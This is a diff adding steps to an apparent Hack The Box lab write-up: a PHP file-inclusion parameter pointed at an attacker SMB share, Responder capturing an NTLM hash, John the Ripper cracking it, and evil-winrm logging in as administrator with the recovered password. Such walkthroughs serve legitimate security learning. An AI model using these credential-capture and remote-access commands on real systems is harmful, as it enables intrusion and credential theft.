@@ -59,3 +59,50 @@ It would look like this:
 
 We can see that the file has been included. In this case a unsanitized "include()" function in php.
 
+# NTLM
+
+NTLM stands for NT LAN Manager, which is a set of protocols made for Microsoft authentication, made for identity vailadtion and data integrity.
+
+# Responder
+
+> Kali responder is a tool that can be used to respond to and exploit SMB traffic. It can be used to capture credentials, perform man-in-the-middle attacks, and more.
+
+Now that we now what "Responder" is for, plus the fact that we are in a windows machine. Lets try and intercept some credentials.
+
+> Usually we would be using the interface eth0, but as we are using a vpn with HTB, tun0 is the one to choose
+
+```
+sudo responder -I tun0 -v
+```
+Then after trying the url: `http://unika.htb/?page=//[atacker_IP]/somefile`
+>Basicaly we are making the web use a parameter to connect to our smb, which the responder uses to catch the credentials of the windows user hosting the webpage.
+
+This should be the result:
+
+![alt text](./img/respondertool.png)
+
+Having a hash, the next step would be to unhash it to see its content.
+
+# JOHN THE RIPPER
+
+> John the Ripper, also known as JtR, is software designed to recover passwords from their hashes, which are encrypted representations of the original passwords.
+
+After dehashing
+![alt text](./img/john.png)
+
+# WinRM
+
+While doing the nmap, we also scanned a port 5985, which is used for WinRM(Windows Remote Management)
+
+Because PowerShell isn't installed 
+on Linux by default, we'll have to use a tool called  EvilWinRM. This tool was made for this kind of scenarios
+
+
+```
+evil-winrm -i 10.129.90.239 -u administrator -p badminton
+```
+![alt text](./img/winrm.png)
+
+We are connected.
+
+Inside the user mike, on its desktop we'll find the flag
